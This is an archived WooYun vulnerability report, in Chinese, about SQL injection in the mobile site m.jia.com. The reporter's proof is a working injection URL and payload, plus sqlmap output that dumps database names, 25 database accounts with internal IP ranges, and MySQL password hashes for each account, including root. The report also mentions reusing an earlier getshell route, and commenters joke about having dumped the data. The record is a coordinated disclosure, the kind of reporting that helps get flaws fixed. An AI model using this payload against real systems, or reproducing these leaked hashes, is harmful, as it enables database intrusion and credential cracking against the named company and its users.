{"id": 2244, "wybug_id": "wooyun-2014-066339", "wybug_title": "齐家网某漏洞可影响百万用户数据2", "wybug_corp": "jia.com", "wybug_author": "疯子", "wybug_date": "2014-06-26 20:26", "wybug_open_date": "2014-08-10 20:28", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数据库账户权限过高"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-27：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-07-07：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-17：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-07-27：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-10：\t细节向公众公开  简要描述： 既然你们确认了，我就多帮帮你们挖点漏洞，如果有需要可以参加众测联系301！ 详细说明：  1、测试中发现m.jia.com存在注入漏洞http://m.jia.com/index.php?a=tg_detail&act_id=22596&areaflag=if(now()%3dsysdate()%2csleep(0)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(0)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(0)%2c0))OR%22*/&channel_id=1&m=tg 并且也是和上一个同样的数据库，这样也就可以利用上个漏洞的getshell方法进行进一步的渗透获取核心数据 详情请参考： WooYun: 齐家网某漏洞可影响百万用户数据   漏洞证明：  sqlmap identified the following injection points with a total of 379 HTTP(s) requests:---Place: URIParameter: #2*    Type: UNION query    Title: MySQL UNION query (39) - 1 column    Payload: http://m.jia.com:80/index.php?a=tg_detail&act_id=22596&areaflag=if(now()=sysdate(),sleep(0),0)/'XOR(if(now()=sysdate(),sleep(0),0))OR'\"XOR(if(now()=sysdate(),sleep(0),0))OR\"' UNION ALL SELECT CONCAT(0x716b776b71,0x43686a62735076584261,0x71796a6871)#/&channel_id=1&m=tg---web application technology: Apacheback-end DBMS: MySQL >= 5.0.0sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: URIParameter: #2*    Type: UNION query    Title: MySQL UNION query (39) - 1 column    Payload: http://m.jia.com:80/index.php?a=tg_detail&act_id=22596&areaflag=if(now()=sysdate(),sleep(0),0)/'XOR(if(now()=sysdate(),sleep(0),0))OR'\"XOR(if(now()=sysdate(),sleep(0),0))OR\"' UNION ALL SELECT CONCAT(0x716b776b71,0x43686a62735076584261,0x71796a6871)#/&channel_id=1&m=tg---web application technology: Apacheback-end DBMS: MySQL 5available databases [13]:[*] _del_aabb_20140609bak[*] _del_mobile_comm_20140609bak[*] _del_mobile_crm_jia_20140609bak[*] _del_mobile_digital_20140609bak[*] _del_mobile_jia_20140609bak[*] _del_mobile_pocket_20140609bak[*] _del_mobile_tg_20140609bak[*] _del_xiuxiu_20140609bak[*] ConfigDB[*] information_schema[*] mobile_crm[*] mysql[*] testsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: URIParameter: #2*    Type: UNION query    Title: MySQL UNION query (39) - 1 column    Payload: http://m.jia.com:80/index.php?a=tg_detail&act_id=22596&areaflag=if(now()=sysdate(),sleep(0),0)/'XOR(if(now()=sysdate(),sleep(0),0))OR'\"XOR(if(now()=sysdate(),sleep(0),0))OR\"' UNION ALL SELECT CONCAT(0x716b776b71,0x43686a62735076584261,0x71796a6871)#/&channel_id=1&m=tg---web application technology: Apacheback-end DBMS: MySQL 5database management system users [25]:[*] %27admin%27%40%27localhost%27[*] %27biselect%27%40%2710.10.10.120%27[*] %27cactiuser%27%40%2710.10.20.110%27[*] %27liweishi%27%40%2710.10.20.%25%27[*] %27liweishi%27%40%27192.168.99.157%27[*] %27mobile_digital%27%40%2710.10.20.%25%27[*] %27mobileselect%27%40%2710.10.10.120%27[*] %27monitor%27%40%27localhost%27[*] %27root%27%40%27%25%27[*] %27root%27%40%27127.0.0.1%27[*] %27root%27%40%27localhost%27[*] %27script%27%40%27%25%27[*] %27script%27%40%27localhost%27[*] %27tgwap%27%40%2710.10.%25.%25%27[*] %27tgwap%27%40%2710.10.20.139%27[*] %27tgwap%27%40%27192.168.%25.%25%27[*] %27tgwap%27%40%27localhost%27[*] %27us_zhjing%27%40%27192.168.99.%25%27[*] %27usvr_backup%27%40%27%25%27[*] %27usvr_checksums%27%40%2710.10.20.%25%27[*] %27usvr_dbmonitor%27%40%27localhost%27[*] %27usvr_replicate%27%40%2710.10.20.%25%27[*] %27zhuangxiu%27%40%2710.10.%25%27[*] %27zhuangxiu%27%40%2710.10.20.%25%27[*] %27zhuangxiu%27%40%27192.168.%25%27sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: URIParameter: #2*    Type: UNION query    Title: MySQL UNION query (39) - 1 column    Payload: http://m.jia.com:80/index.php?a=tg_detail&act_id=22596&areaflag=if(now()=sysdate(),sleep(0),0)/'XOR(if(now()=sysdate(),sleep(0),0))OR'\"XOR(if(now()=sysdate(),sleep(0),0))OR\"' UNION ALL SELECT CONCAT(0x716b776b71,0x43686a62735076584261,0x71796a6871)#/&channel_id=1&m=tg---web application technology: Apacheback-end DBMS: MySQL 5database management system users password hashes:[*] admin [1]:    password hash: %2A0108F76A1B387B83CEACDD74221B18BF86FFEF9A[*] biselect [1]:    password hash: %2ABF652E1DA7BD6A90A1B5E387D768841F3E35CEDA[*] cactiuser [1]:    password hash: %2A43DD7940383044FBDE5B177730FAD3405BC6DAD7[*] liweishi [1]:    password hash: %2A09FAB5CDD4005671FF5E9B68052B46EF400980D8[*] mobile_digital [1]:    password hash: %2AFFFBC4FB84878A38B3BF12B3E4E24E751C9D0555[*] mobileselect [1]:    password hash: %2A054E07DCB185488266FBBDBC46D8712966B92BA8[*] monitor [1]:    password hash: %2AB25DC303840BB35DE25FF34226D7CCB3482BA77E[*] root [2]:    password hash: %2A2C2C461A198E81E755233A41340908984B984877    password hash: %2A3D8D82A53A71F6E3BD29F3234EC0844505BD1122[*] script [1]:    password hash: %2A9F711306729703C16347B99B93CC8035190CCFAE[*] tgwap [1]:    password hash: %2A5B70591C04EB0611C2A79954EFBDDC5FBBB815CD[*] us_zhjing [1]:    password hash: %2A8338C6A5F3E032441C77D7EFBD65BA6EE5EA1F49[*] usvr_backup [1]:    password hash: %2AE9382B7C030E8F605A18DCC211923C0258F91AB7[*] usvr_checksums [1]:    password hash: %2A39BF3FC1890A52A2B9090C9B2A3383C045A06172[*] usvr_dbmonitor [1]:    password hash: %2A55770B9D02C239533CA1F1B55D486050E76F75DE[*] usvr_replicate [1]:    password hash: %2A7FE421F5A9A6FECB19DBFF4C52BA35700D215671[*] zhuangxiu [1]:    password hash: %2A8B88C25DFBE770095FF440727D92232D18C6E0A5   修复方案：  希望你们对安全更加重视，并且解决安全问题，保障用户的个人信息！   版权声明：转载请注明来源 疯子@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2014-06-27 09:02 厂商回复： 谢谢您的关注，我们会努力做好安全工作 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-06-26 21:34 |    \t\tLonely \t\t\t( 实习白帽子  |\t\t\t        Rank:72 漏洞数:27        | 人生如梦,始终都游不过当局者迷的悲哀。)\t\t \n  @疯子 还是你厉害 逼着他们出来确认了 呵呵 看来是不脱 不会出现啊。 为啥那么犯二呢 我们提交的时候 确认掉 修复好 屁事没了     \n     2014-06-26 22:59 |    \t\t追逐天堂 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:10        | 请叫我路人丁)\t\t \n  @Lonely 脱了  就是没看内容 今天我吓呆了    \n     2014-06-27 00:13 |    \t\tby阿明 \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:9        | 孤独与寂寞是我的必修课)\t\t \n  疯子据说你是重庆的·····    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}